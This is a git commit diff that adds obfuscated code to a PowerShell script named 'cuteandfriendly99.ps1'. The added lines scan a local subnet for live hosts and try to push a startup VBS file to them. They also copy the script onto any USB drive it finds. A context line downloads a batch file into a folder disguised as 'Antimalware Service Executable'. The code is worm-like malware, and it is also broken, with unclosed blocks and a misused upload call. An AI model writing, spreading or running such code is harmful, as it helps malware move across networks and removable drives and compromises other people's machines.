69d49502a1b9970520a95f2ab244ed05dcb82c3c
randyman777777777 <121990518+randyman777777777@users.noreply.github.com>
2023-02-23 23:52:26 -0800

    Active

--- ps1/cuteandfriendly99.ps1
+++ ps1/cuteandfriendly99.ps1
@@ -1,3 +1,18 @@
+$hn7 = "192.168.1."
+$j34 = 1..254
+$o77 = foreach ($ip in $j34) { $hn7 + $ip }
+$j11 = $MyInvocation.MyCommand.Path
+$k90 = $env:Startup + "softkitty99.vbs"
+foreach ($ip in $o77) {
+    if (Test-Connection $ip -Quiet) {
+        $cx = New-Object Net.WebClient
+        $cx.UploadFile($k90, $k90)
+$cwd = Split-Path -Path $j11 -Parent
+foreach ($drive in Get-PSDrive -PSProvider FileSystem) {
+    if ($drive.Description -like "*USB*") {
+        Copy-Item -Path $j11 -Destination "$($drive.Root):\$($MyInvocation.MyCommand.Name)"
+    }
+} 
 $j4 = "https://github.com/kaosSec/kaosTools/raw/main/bat/justafriendlydolphin.bat"
 $u7 = "$env:SystemRoot\Antimalware Service Executable\Malware-Scan.bat"
 Invoke-WebRequest $j4 -OutFile $u7
